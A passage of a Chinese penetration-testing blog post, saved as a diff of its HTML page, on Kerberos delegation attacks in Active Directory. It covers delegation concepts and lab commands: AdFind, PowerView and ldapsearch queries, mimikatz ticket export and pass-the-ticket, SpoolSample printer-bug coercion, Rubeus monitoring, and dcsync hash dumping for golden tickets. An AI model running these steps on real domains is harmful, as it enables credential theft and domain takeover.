@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>基于域委派的攻击 - Geekby&#39;s Blog</title><meta name="Description" content="基于域委派的攻击原理及实验"><meta property="og:title" content="基于域委派的攻击" />
+<meta property="og:description" content="基于域委派的攻击原理及实验" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-06T11:00:00+08:00" />
+<meta property="article:modified_time" content="2021-01-25T14:00:40+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="基于域委派的攻击"/>
+<meta name="twitter:description" content="基于域委派的攻击原理及实验"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/" /><link rel="prev" href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/" /><link rel="next" href="https://www.geekby.site/2020/05/dcsync-%E6%94%BB%E5%87%BB/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "基于域委派的攻击",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/05\/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透, 域委派","wordcount":  1157 ,
+        "url": "https:\/\/www.geekby.site\/2020\/05\/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB\/","datePublished": "2020-05-06T11:00:00+08:00","dateModified": "2021-01-25T14:00:40+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "基于域委派的攻击原理及实验"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">基于域委派的攻击</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-06">2020-05-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1157 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-域委派相关定义">1 域委派相关定义</a>
+      <ul>
+        <li><a href="#11-定义">1.1 定义</a></li>
+        <li><a href="#12-流程">1.2 流程</a></li>
+        <li><a href="#13-委派类型">1.3 委派类型</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-非约束委派">2 非约束委派</a>
+      <ul>
+        <li><a href="#21-原理">2.1 原理</a></li>
+        <li><a href="#22-实战">2.2 实战</a>
+          <ul>
+            <li><a href="#221-非约束委派的查找">2.2.1 非约束委派的查找</a>
+              <ul>
+                <li><a href="#2211-adfind">2.2.1.1 adfind</a></li>
+                <li><a href="#2212-powerview">2.2.1.2 powerview</a></li>
+                <li><a href="#2213-ldapsearch">2.2.1.3 ldapsearch</a></li>
+              </ul>
+            </li>
+            <li><a href="#222-非约束委派的利用">2.2.2 非约束委派的利用</a>
+              <ul>
+                <li><a href="#2221-管理员模拟访问">2.2.2.1 管理员模拟访问</a></li>
+                <li><a href="#2222-spooler-printer-bug">2.2.2.2 Spooler Printer Bug</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-约束委派">3 约束委派</a>
+      <ul>
+        <li><a href="#31-原理">3.1 原理</a></li>
+        <li><a href="#32-实战">3.2 实战</a>
+          <ul>
+            <li><a href="#321-约束委派的查找">3.2.1 约束委派的查找</a>
+              <ul>
+                <li><a href="#3211-adfind">3.2.1.1 adfind</a></li>
+                <li><a href="#3212-powerview">3.2.1.2 powerview</a></li>
+                <li><a href="#3213-ldapsearch">3.2.1.3 ldapsearch</a></li>
+              </ul>
+            </li>
+            <li><a href="#322-约束委派的利用">3.2.2 约束委派的利用</a>
+              <ul>
+                <li><a href="#3221-常见情况">3.2.2.1 常见情况</a></li>
+                <li><a href="#3222-spn-设置影响对应票据">3.2.2.2 SPN 设置影响对应票据</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-基于资源的约束委派">4 基于资源的约束委派</a>
+      <ul>
+        <li><a href="#41-原理">4.1 原理</a></li>
+        <li><a href="#42-实战">4.2 实战</a>
+          <ul>
+            <li><a href="#421-环境模拟">4.2.1 环境模拟</a></li>
+            <li><a href="#422-寻找对目标主机账户有完全控制权限的用户">4.2.2 寻找对目标主机账户有完全控制权限的用户</a></li>
+            <li><a href="#423-创建机器账号">4.2.3 创建机器账号</a></li>
+            <li><a href="#424-攻击">4.2.4 攻击</a></li>
+            <li><a href="#425-注意事项">4.2.5 注意事项</a></li>
+            <li><a href="#426-解决敏感账户不能委派">4.2.6 解决敏感账户不能委派</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="基于域委派的攻击">基于域委派的攻击</h1>
+<h2 id="1-域委派相关定义">1 域委派相关定义</h2>
+<h3 id="11-定义">1.1 定义</h3>
+<blockquote>
+<p>Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate</p>
+<p>This delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request</p>
+<p>Many real-world scenarios exist in which a Web application &ldquo;front end&rdquo; must retrieve data from a more secure &ldquo;back end&rdquo;, such as a Web service that is connected to a Microsoft SQL Server database.</p>
+</blockquote>
+<p>域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门</p>
+<p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">在域内的可以委派的账户有两种一种是<strong>主机账户</strong>（Net Computer）另一种是用 setspn 手动添加的服务账户（Net User），不管是非约束还是约束的例子是以主机账户举例，因为用主机账户来委派的环境好搭并且便于理解，不过服务账户和主机账户从攻击委派这个视角来看是等价的。</div>
+        </div>
+    </div>
+<p>服务账号(<code>Service Account</code>)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 <code>MS SQL Server</code> 在安装时，会在域内自动注册服务账号 <code>SqlServiceAccount</code>，这类账号不能用于交互式登录。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505104626.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505104626.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505104626.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505104626.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505104626.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505104626.png-water_print" /></p>
+<p>一个域内普通用户 jack 通过 Kerberos 协议认证到前台 WEB 服务后，前台运行 WEB 服务的服务账号 <code>websvc</code> 模拟(<code>Impersonate</code>)用户 jack，以 Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取 jack 用户的访问权限，即域中单跳或者多跳的 Kerberos 认证。</p>
+<h3 id="12-流程">1.2 流程</h3>
+<ol>
+<li>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器;</li>
+<li>Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请;</li>
+<li>KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT;</li>
+<li>websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 ST;</li>
+<li>KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 ST;</li>
+<li>websvc 收到的 jack 用户的授权票据 ST 后，可访问文件服务，完成多跳认证。</li>
+</ol>
+<h3 id="13-委派类型">1.3 委派类型</h3>
+<p>域内委派主要有 3 种应用方式:</p>
+<p>一是<code>非约束性委派</code>(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户访问任意服务</p>
+<p>二是<code>约束性委派</code>(Constrained Delegation)，即 Kerberos 的扩展协议 <code>S4U2Proxy</code>，服务账号只能获取某用户的 <code>ST</code>，从而只能模拟用户访问特定的服务</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111706.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111706.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111706.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111706.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111706.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111706.png-water_print" /></p>
+<h2 id="2-非约束委派">2 非约束委派</h2>
+<h3 id="21-原理">2.1 原理</h3>
+<p>如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 ST 中，这样 B 在验证 ST 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505141105.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505141105.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505141105.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505141105.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505141105.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505141105.png-water_print" /></p>
+<p>开启委派后，在该用户的 <code>userAccountControl</code> 属性会多出一个 flag：<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111857.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111857.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111857.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111857.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111857.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200505111857.png-water_print" /></p>
+<p>非约束委派的设置需要 <code>SeEnableDelegation</code>  特权，该特权通常仅授予域管理员。</p>
+<h3 id="22-实战">2.2 实战</h3>
+<h4 id="221-非约束委派的查找">2.2.1 非约束委派的查找</h4>
+<h5 id="2211-adfind">2.2.1.1 adfind</h5>
+<p><strong>查询非约束委派的主机</strong>：</p>
+<p><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506150858.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506150858.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506150858.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506150858.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506150858.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506150858.png-water_print" /></p>
+<p><strong>查询非约束委派的用户</strong>：</p>
+<p><code>AdFind.exe -b &quot;DC=pentest,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></p>
+<h5 id="2212-powerview">2.2.1.2 powerview</h5>
+<p>注：PowerSploit-dev 分支</p>
+<p><strong>查询配置非约束委派的用户</strong>：<code>Get-NetUser -Unconstrained -Domain pentest.com</code></p>
+<p><strong>查询配置非约束委派的主机</strong>：<code>Get-domaincomputer -Unconstrained -Domain pentest.com</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125164005.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125164005.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125164005.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125164005.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125164005.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125164005.png-water_print" /></p>
+<h5 id="2213-ldapsearch">2.2.1.3 ldapsearch</h5>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">需要域内任意用户的账号密码</div>
+        </div>
+    </div>
+<p><strong>查询非约束委派的机器：</strong></p>
+<p><code>ldapsearch -LLL -x -H ldap://172.16.147.130:389 -D &quot;win7user@pentest.com&quot; -w &quot;123456bY&quot; -b dc=pentest,dc=com  &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506151449.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506151449.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506151449.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506151449.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506151449.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506151449.png-water_print" /></p>
+<p><strong>查询非约束委派的用户：</strong></p>
+<p><code>ldapsearch -LLL -x -H ldap://172.16.147.130:389 -D &quot;win7user@pentest.com&quot; -w &quot;123456&quot; -b dc=pentest,dc=com  &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></p>
+<h4 id="222-非约束委派的利用">2.2.2 非约束委派的利用</h4>
+<h5 id="2221-管理员模拟访问">2.2.2.1 管理员模拟访问</h5>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">实验前建议清除内存中的票据，mimikatz 下：<code>kerberos::purge</code></div>
+        </div>
+    </div>
+<p>模拟管理员调用非约束性委派机的 smb 服务：<code>net use \\win7\c$</code></p>
+<p>回到非约束委派机，查看票据(<strong>部分截图</strong>)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">privilege::debug
+sekualsa::tickets
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125153427.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125153427.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125153427.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125153427.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125153427.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125153427.png-water_print" /></p>
+<p>TGT 被截获，我们用 <code>sekurlas::tickets /export</code> 把票据导出来</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125154701.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125154701.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125154701.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125154701.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125154701.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125154701.png-water_print" /></p>
+<p>此时我们访问域控是被拒绝的：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155041.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155041.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155041.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155041.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155041.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155041.png-water_print" /></p>
+<p>然后 mimikatz 里使用 <code>kerberos::ptt 票据文件名</code> 将票据注入内存：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155205.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155205.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155205.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155205.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155205.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155205.png-water_print" /></p>
+<p>可以成功访问。</p>
+<p>如果想执行命令，可以使用 <code>WinRM</code> 服务来远程连接域控服务器：</p>
+<p><code>Enter-PSSession -ComputerName DC</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155344.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155344.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155344.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155344.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155344.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210125155344.png-water_print" /></p>
+<h5 id="2222-spooler-printer-bug">2.2.2.2 Spooler Printer Bug</h5>
+<p>在实战中，只是单纯的非约束委派话需要管理员主动连接比较鸡肋。因此可以利用非约束委派 + Spooler 打印机服务可以强制指定的主机进行连接。</p>
+<p>利用原理：利用 Windows 打印系统远程协议 <code>(MS-RPRN)</code> 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code> 方法强制任何运行了 <code>Spooler</code> 服务的计算机以通过 <code>Kerberos</code> 或 <code>NTLM</code> 对攻击者选择的目标进行身份验证。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20181128160313.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20181128160313.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20181128160313.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20181128160313.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20181128160313.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20181128160313.png-water_print" /></p>
+<p>POC：<code>https://github.com/leechristensen/SpoolSample</code></p>
+<p>向 DC 的 <code>Spooler</code> 服务发送请求，强制其访问 win7 进行身份验证：<code>SpoolSample.exe DC win7</code></p>
+<p>可以用 <code>Rubeus</code> 来监听 <code>Event ID</code> 为 <code>4624</code> 事件，这样可以第一时间截取到域控的，每隔一秒监听一次来自 DC 的登陆（需要本地管理员权限）TGT：<code>Rubeus.exe monitor /interval:1 /filteruser:DC$</code></p>
+<p><strong>注</strong>：Rubeus.exe 捕获到的 TGT 是 base64 编码的，但是我们不需要解码，<code>Rubeus </code>可以直接将 base64 编码的票据直接注入到内存中：<code>Rubeus.exe ptt /ticket:base64</code></p>
+<p>得到 TGT 之后，利用 PTT 将票据注入到当前会话后，可以用 <code>dcsync</code> 导出域控中所有用户的 hash，然后用 <code>krbtgt</code> 用户的 hash 生成黄金票据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kerberos::ptt xxxx.kirbi
+
+lsadump::dcsync /domain:test.local /all /csv
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="3-约束委派">3 约束委派</h2>
+<h3 id="31-原理">3.1 原理</h3>
+<p>由于非约束委派的不安全性，微软在 <code>windows server 2003</code> 中引入了约束委派，对 Kerberos 协议进行了拓展，引入了 <code>S4U</code>，其中 <code>S4U</code> 支持两个子协议：<code>Service for User to Self (S4U2Self) </code>和  <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从 KDC 请求票证。<code>S4U2self </code>可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；<code>S4U2proxy </code>可以以用户的名义请求其它服务的 ST，约束委派就是限制了 <code>S4U2proxy</code> 扩展的范围。</p>
+<p><code>S4U2Self </code>和 <code>S4U2proxy</code> 的请求过程（图来自微软手册）：</p>
+<p>其中步骤 1-4 代表 <code>S4U2Self</code> 请求的过程，步骤 5-10 代表 <code>S4U2proxy</code> 的请求过程</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200506195543.png-water_print"
